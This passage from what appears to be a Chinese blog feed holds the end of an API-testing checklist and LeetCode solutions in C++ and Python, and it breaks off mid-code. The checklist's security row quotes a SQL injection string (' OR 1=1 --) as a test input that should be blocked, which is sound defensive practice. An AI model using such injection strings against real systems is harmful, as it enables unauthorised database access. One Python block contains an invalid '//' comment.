<td></td>
<td>接口依赖关系测试</td>
<td>验证接口依赖的其他服务或数据源异常时，是否能正确处理（如降级、超时）。</td>
</tr>
<tr>
<td></td>
<td>异常业务处理逻辑</td>
<td>验证业务异常场景（如余额不足、库存为负）是否返回明确的错误码和描述。</td>
</tr>
<tr>
<td><strong>参数测试</strong></td>
<td>参数值全量覆盖验证</td>
<td>对参数所有可能取值（枚举值、布尔值等）进行覆盖测试。</td>
</tr>
<tr>
<td></td>
<td>必填参数正确性验证</td>
<td>必填参数传入有效值时，接口返回预期结果。</td>
</tr>
<tr>
<td></td>
<td>必填/非必填参数组合验证</td>
<td>测试不同必填与非必填参数组合下的接口行为（如缺少非必填参数是否影响功能）。</td>
</tr>
<tr>
<td></td>
<td>参数边界值验证</td>
<td>验证参数在边界值（如最大值、最小值、空值、超长字符串）下的处理逻辑。</td>
</tr>
<tr>
<td><strong>异常测试</strong></td>
<td>必填参数缺失</td>
<td>缺失必填参数时是否返回明确错误码（如<code>400 Bad Request</code>）。</td>
</tr>
<tr>
<td></td>
<td>非法参数值</td>
<td>传入非法参数（如非数字传入数字字段）是否返回类型错误提示。</td>
</tr>
<tr>
<td></td>
<td>超限参数值</td>
<td>参数超过允许范围（如金额超限）是否触发业务规则校验。</td>
</tr>
<tr>
<td><strong>性能测试</strong></td>
<td>响应时间</td>
<td>单请求响应时间是否在SLA要求范围内（如≤500ms）。</td>
</tr>
<tr>
<td></td>
<td>并发处理能力</td>
<td>高并发场景下接口是否稳定（如100并发用户请求成功率≥99%）。</td>
</tr>
<tr>
<td></td>
<td>大数据量处理</td>
<td>处理大量数据时（如万级列表查询）是否返回正确且性能达标。</td>
</tr>
<tr>
<td><strong>安全性测试</strong></td>
<td>敏感信息加密</td>
<td>返回的敏感数据（如手机号、身份证号）是否脱敏或加密。</td>
</tr>
<tr>
<td></td>
<td>未授权访问防护</td>
<td>未携带Token或权限不足时是否返回<code>401 Unauthorized</code>。</td>
</tr>
<tr>
<td></td>
<td>SQL注入防护</td>
<td>传入SQL注入语句（如<code>' OR 1=1 --</code>）是否被拦截并返回错误。</td>
</tr>
<tr>
<td><strong>幂等性测试</strong></td>
<td>重复请求一致性</td>
<td>多次提交相同请求（如支付）是否仅产生一次有效结果。</td>
</tr>
<tr>
<td><strong>兼容性测试</strong></td>
<td>多版本兼容</td>
<td>新旧版本接口参数格式（如v1/v2）是否能兼容处理。</td>
</tr>
<tr>
<td></td>
<td>多客户端兼容</td>
<td>不同客户端（Web/App/第三方）调用接口时返回数据格式是否一致。</td>
</tr>
</tbody>
</table>
<h2 id="功能测试">功能测试</h2>
<ul>
<li>测试环境没问题，但⽣产/灰度环境有问题，会从哪些原因去定位排查</li>
</ul>
<p>1、部署原因，⽣产/灰度环境的代码与测试环境验证通过的不⼀致<br>
2、测试数据问题，有些bug需要特殊的数据才能重现出来<br>
3、配置原因，⽣产/灰度环境的配置出问题</p>
]]></content>
      <tags>
        <tag>测试</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode</title>
    <url>/2025/03/17/leetcode/</url>
    <content><![CDATA[<h1>哈希</h1>
<h2 id="1-两数之和">1.两数之和</h2>
<p>快速查找需求</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums,<span class="type">int</span> target)</span></span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; hashtable;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">auto</span> it = hashtable.<span class="built_in">find</span>(target-nums[i]);</span><br><span class="line">            <span class="keyword">if</span>(it !=hashtable.<span class="built_in">end</span>())&#123;</span><br><span class="line">                <span class="keyword">return</span> &#123;i,it-&gt;second&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            hashtable[nums[i]]=i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">twoSum</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>], target: <span class="built_in">int</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        hashtable=&#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">if</span> target-nums[i] <span class="keyword">in</span> hashtable:</span><br><span class="line">                <span class="keyword">return</span> [i,hashtable[target-nums[i]]]</span><br><span class="line">            hashtable[nums[i]] =i</span><br><span class="line">        <span class="keyword">return</span> []</span><br></pre></td></tr></table></figure>
<h2 id="面试题-16-15-珠玑妙算">面试题 16.15 珠玑妙算</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">masterMind</span><span class="params">(string solution, string guess)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ri= <span class="number">0</span>,fr=<span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> dic[<span class="number">4</span>][<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; char_to_index = &#123;&#123;<span class="string">&#x27;R&#x27;</span>,<span class="number">0</span>&#125;,&#123;<span class="string">&#x27;Y&#x27;</span>,<span class="number">1</span>&#125;,&#123;<span class="string">&#x27;G&#x27;</span>,<span class="number">2</span>&#125;,&#123;<span class="string">&#x27;B&#x27;</span>,<span class="number">3</span>&#125;&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)&#123;</span><br><span class="line">            <span class="type">char</span> s=solution[i],g = guess[i];</span><br><span class="line">            <span class="keyword">if</span>(s==g)</span><br><span class="line">                ri++;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                dic[char_to_index[s]][<span class="number">0</span>]++;</span><br><span class="line">                dic[char_to_index[g]][<span class="number">1</span>]++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++)</span><br><span class="line">            fr+=<span class="built_in">min</span>(dic[i][<span class="number">0</span>],dic[i][<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> &#123;ri,fr&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 低效</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">masterMind</span>(<span class="params">self, solution: <span class="built_in">str</span>, guess: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        hash_sol,hash_gue = defaultdict(<span class="built_in">int</span>),defaultdict(<span class="built_in">int</span>)</span><br><span class="line">        right,fr=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            <span class="keyword">if</span> solution[i]==guess[i]:</span><br><span class="line">                right += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                hash_gue[guess[i]]+=<span class="number">1</span></span><br><span class="line">                hash_sol[solution[i]]+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> key <span class="keyword">in</span> hash_gue:</span><br><span class="line">            <span class="keyword">if</span> key <span class="keyword">in</span> hash_sol:</span><br><span class="line">                fr += <span class="built_in">min</span> (hash_sol[key],hash_gue[key])</span><br><span class="line">        <span class="keyword">return</span> [right,fr]</span><br><span class="line"><span class="comment"># 优化</span></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">masterMind</span>(<span class="params">self, solution: <span class="built_in">str</span>, guess: <span class="built_in">str</span></span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span><br><span class="line">        <span class="comment"># 初始化猜中次数和伪猜中次数</span></span><br><span class="line">        corr, err = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 使用列表代替字典，索引对应字符：</span></span><br><span class="line">        <span class="comment"># 0: &#x27;R&#x27;, 1: &#x27;Y&#x27;, 2: &#x27;G&#x27;, 3: &#x27;B&#x27;</span></span><br><span class="line">        <span class="comment"># dic[char][0]: solution 中未匹配的字符数量</span></span><br><span class="line">        <span class="comment"># dic[char][1]: guess 中未匹配的字符数量</span></span><br><span class="line">        dic = [[<span class="number">0</span>, <span class="number">0</span>] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 字符到索引的映射</span></span><br><span class="line">        char_to_index = &#123;<span class="string">&#x27;R&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;Y&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;G&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;B&#x27;</span>: <span class="number">3</span>&#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 遍历字符串，统计猜中次数和未匹配字符</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            s, g = solution[i], guess[i]</span><br><span class="line">            <span class="keyword">if</span> s == g:</span><br><span class="line">                corr += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 更新 solution 中未匹配字符的数量</span></span><br><span class="line">                dic[char_to_index[s]][<span class="number">0</span>] += <span class="number">1</span></span><br><span class="line">                <span class="comment"># 更新 guess 中未匹配字符的数量</span></span><br><span class="line">                dic[char_to_index[g]][<span class="number">1</span>] += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 计算伪猜中次数</span></span><br><span class="line">        <span class="keyword">for</span> count_sol, count_gue <span class="keyword">in</span> dic:</span><br><span class="line">            err += <span class="built_in">min</span>(count_sol, count_gue)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> [corr, err]</span><br></pre></td></tr></table></figure>
<h2 id="1941-检查是否所有字符出现次数相同">1941 检查是否所有字符出现次数相同</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">areOccurrencesEqual</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span> ,<span class="type">int</span>&gt; hashtable;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c :s)</span><br><span class="line">            hashtable[c]++;</span><br><span class="line">        <span class="type">int</span> n = hashtable[s[<span class="number">0</span>]];</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">char</span> c :s)&#123;</span><br><span class="line">            <span class="keyword">if</span>(hashtable[c]!=n)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">areOccurrencesEqual</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        hashtable = defaultdict(<span class="built_in">int</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            hashtable[i]+=<span class="number">1</span></span><br><span class="line">        n = hashtable[s[<span class="number">0</span>]]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> hashtable:</span><br><span class="line">            <span class="keyword">if</span> n!=hashtable[i]:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="comment"># 优化</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">areOccurrencesEqual</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">        c = Counter(s)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">len</span>(<span class="built_in">set</span>(c.values())) == <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="13-罗马数字转整数">13 罗马数字转整数</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">romanToInt</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        unordered_map &lt;<span class="type">char</span>,<span class="type">int</span>&gt; dic = &#123;&#123;<span class="string">&#x27;I&#x27;</span>,<span class="number">1</span>&#125;,&#123;<span class="string">&#x27;V&#x27;</span>,<span class="number">5</span>&#125;,&#123;<span class="string">&#x27;X&#x27;</span>,<span class="number">10</span>&#125;,&#123;<span class="string">&#x27;L&#x27;</span>,<span class="number">50</span>&#125;,&#123;<span class="string">&#x27;C&#x27;</span>,<span class="number">100</span>&#125;,&#123;<span class="string">&#x27;D&#x27;</span>,<span class="number">500</span>&#125;,&#123;<span class="string">&#x27;M&#x27;</span>,<span class="number">1000</span>&#125;&#125;;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        // 使用数组代替 unordered_map更快</span></span><br><span class="line"><span class="comment">        int dic[256] = &#123;0&#125;; // ASCII 表大小为 256</span></span><br><span class="line"><span class="comment">        dic[&#x27;I&#x27;] = 1;</span></span><br><span class="line"><span class="comment">        dic[&#x27;V&#x27;] = 5;</span></span><br><span class="line"><span class="comment">        dic[&#x27;X&#x27;] = 10;</span></span><br><span class="line"><span class="comment">        dic[&#x27;L&#x27;] = 50;</span></span><br><span class="line"><span class="comment">        dic[&#x27;C&#x27;] = 100;</span></span><br><span class="line"><span class="comment">        dic[&#x27;D&#x27;] = 500;</span></span><br><span class="line"><span class="comment">        dic[&#x27;M&#x27;] = 1000;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;s.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i!=s.<span class="built_in">length</span>()<span class="number">-1</span> &amp;&amp; dic[s[i]]&lt;dic[s[i<span class="number">+1</span>]])</span><br><span class="line">                result-=dic[s[i]];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                result+=dic[s[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">romanToInt</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        dic = &#123;<span class="string">&quot;I&quot;</span>:<span class="number">1</span>,<span class="string">&quot;V&quot;</span>:<span class="number">5</span>,<span class="string">&quot;X&quot;</span>:<span class="number">10</span>,<span class="string">&quot;L&quot;</span>:<span class="number">50</span>,<span class="string">&quot;C&quot;</span>:<span class="number">100</span>,<span class="string">&quot;D&quot;</span>:<span class="number">500</span>,<span class="string">&quot;M&quot;</span>:<span class="number">1000</span>&#125;</span><br><span class="line">        result = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span>  i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">            <span class="keyword">if</span> i !=<span class="built_in">len</span>(s)-<span class="number">1</span> <span class="keyword">and</span> dic[s[i]] &lt; dic[s[i+<span class="number">1</span>]]  :</span><br><span class="line">                result -= dic[s[i]]</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result += dic[s[i]]</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<h2 id="3-无重复字符的最长子串">3.无重复字符的最长子串</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="type">char</span>&gt; set;</span><br><span class="line">        <span class="type">int</span> n=s.<span class="built_in">length</span>(),r=<span class="number">0</span>,ans=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> l = <span class="number">0</span>;l&lt;n;l++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(l!=<span class="number">0</span>)&#123;</span><br><span class="line">                set.<span class="built_in">erase</span>(s[l<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span>(r&lt;n &amp;&amp; set.<span class="built_in">count</span>(s[r])==<span class="number">0</span>)&#123;</span><br><span class="line">                set.<span class="built_in">insert</span>(s[r]);</span><br><span class="line">                r++;</span><br><span class="line">            &#125;</span><br><span class="line">            ans = <span class="built_in">max</span>(ans,r-l);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lengthOfLongestSubstring</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        occ = <span class="built_in">set</span>()</span><br><span class="line">        n = <span class="built_in">len</span>(s)</span><br><span class="line">        r,ans=<span class="number">0</span>,<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            <span class="keyword">if</span> l != <span class="number">0</span>:</span><br><span class="line">                occ.remove(s[l-<span class="number">1</span>])</span><br><span class="line">            <span class="keyword">while</span> r&lt;n <span class="keyword">and</span> s[r] <span class="keyword">not</span> <span class="keyword">in</span> occ:</span><br><span class="line">                occ.add(s[r])</span><br><span class="line">                r+=<span class="number">1</span></span><br><span class="line">            ans = <span class="built_in">max</span> (ans,r-l)</span><br><span class="line">        <span class="keyword">return</span> ans</span><br></pre></td></tr></table></figure>
<h1>动态规划</h1>
<h2 id="5-最长回文子串">5.最长回文子串</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">longestPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        string result = <span class="string">&quot;&quot;</span>,odd,even;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">length</span>();i++)&#123;</span><br><span class="line">            odd = <span class="built_in">expand</span>(s,i,i);</span><br><span class="line">            even = <span class="built_in">expand</span>(s,i,i<span class="number">+1</span>);</span><br><span class="line">            <span class="keyword">if</span>(odd.<span class="built_in">length</span>()&gt;result.<span class="built_in">length</span>()) result = odd;</span><br><span class="line">            <span class="keyword">if</span>(even.<span class="built_in">length</span>()&gt;result.<span class="built_in">length</span>()) result = even;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">expand</span><span class="params">(string s,<span class="type">int</span> l,<span class="type">int</span> r)</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(l&gt;=<span class="number">0</span> &amp;&amp; r&lt;s.<span class="built_in">length</span>() &amp;&amp; s[l]==s[r])&#123;</span><br><span class="line">            l--,r++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.<span class="built_in">substr</span>(l<span class="number">+1</span>,r-l<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">longestPalindrome</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        n = <span class="built_in">len</span>(s)</span><br><span class="line">        <span class="keyword">if</span> n &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> s</span><br><span class="line">        </span><br><span class="line">        dp = [[<span class="literal">False</span>] * n <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]  <span class="comment"># 初始化 dp 数组</span></span><br><span class="line">        start, end = <span class="number">0</span>, <span class="number">0</span>  <span class="comment"># 记录最长回文子串的起始和结束位置</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 单个字符一定是回文</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            dp[i][i] = <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查长度为 2 的子串</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> s[i] == s[i + <span class="number">1</span>]:</span><br><span class="line">                dp[i][i + <span class="number">1</span>] = <span class="literal">True</span></span><br><span class="line">                start, end = i, i + <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 检查长度大于 2 的子串</span></span><br><span class="line">        <span class="keyword">for</span> length <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, n + <span class="number">1</span>):  <span class="comment"># 子串长度从 3 到 n</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - length + <span class="number">1</span>):  <span class="comment"># 子串起始位置</span></span><br><span class="line">                j = i + length - <span class="number">1</span>  <span class="comment"># 子串结束位置</span></span><br><span class="line">                <span class="keyword">if</span> s[i] == s[j] <span class="keyword">and</span> dp[i + <span class="number">1</span>][j - <span class="number">1</span>]:  <span class="comment"># 状态转移</span></span><br><span class="line">                    dp[i][j] = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">if</span> length &gt; (end - start + <span class="number">1</span>):  <span class="comment"># 更新最长回文子串</span></span><br><span class="line">                        start, end = i, j</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> s[start:end + <span class="number">1</span>]  <span class="comment"># 返回最长回文子串</span></span><br><span class="line">//优化</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">longestPalindrome</span>(<span class="params">self, s: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">max_hw</span>(<span class="params">l:<span class="built_in">int</span>, r:<span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span> :</span><br><span class="line">            <span class="keyword">while</span> l&gt;=<span class="number">0</span> <span class="keyword">and</span> r&lt;<span class="built_in">len</span>(s) <span class="keyword">and</span> s[l] == s[r]:</span><br><span class="line">                l -= <span class="number">1</span></span><br><span class="line">                r += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> s[l+<span class="number">1</span>:r]</span><br><span class="line"></span><br><span class="line">        result = s[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">            odd = max_hw(i,i)</span><br><span class="line">            even = max_hw(i,i+<span class="number">1</span>)</span><br><span class="line">            result = <span class="built_in">max</span>(result,odd,even,key=<span class="built_in">len</span>)</span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<h2 id="509-斐波那契数">509.斐波那契数</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">fib</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> f1=<span class="number">0</span>,f2 =<span class="number">1</span>,temp;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">            temp = f1+f2;</span><br><span class="line">            f1 = f2;</span><br><span class="line">            f2 = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> f2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">fib</span>(<span class="params">self, n: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">        f1 ,f2 ,fn = <span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> n ==<span class="number">0</span> :<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>):</span><br><span class="line">            fn = f1 + f2</span><br><span class="line">            f1, f2 = f2, fn</span><br><span class="line">        <span class="keyword">return</span> fn </span><br></pre></td></tr></table></figure>
<h2 id="300-最长增长子序列">300.最长增长子序列</h2>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n,<span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;n;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;i;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[j]&lt;nums[i])&#123;</span><br><span class="line">                    dp[i] = <span class="built_in">max</span>(dp[i],dp[j]<span class="number">+1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> *<span class="built_in">max_element</span>(dp.<span class="built_in">begin</span>(),dp.<span class="built_in">end</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//优化</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLIS</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums.<span class="built_in">empty</span>()) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; dp;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> num:nums)&#123;</span><br><span class="line">            <span class="keyword">auto</span> it = <span class="built_in">lower_bound</span>(dp.<span class="built_in">begin</span>(),dp.<span class="built_in">end</span>(),num);</span><br><span class="line">            <span class="keyword">if</span>(it == dp.<span class="built_in">end</span>())&#123;</span><br><span class="line">                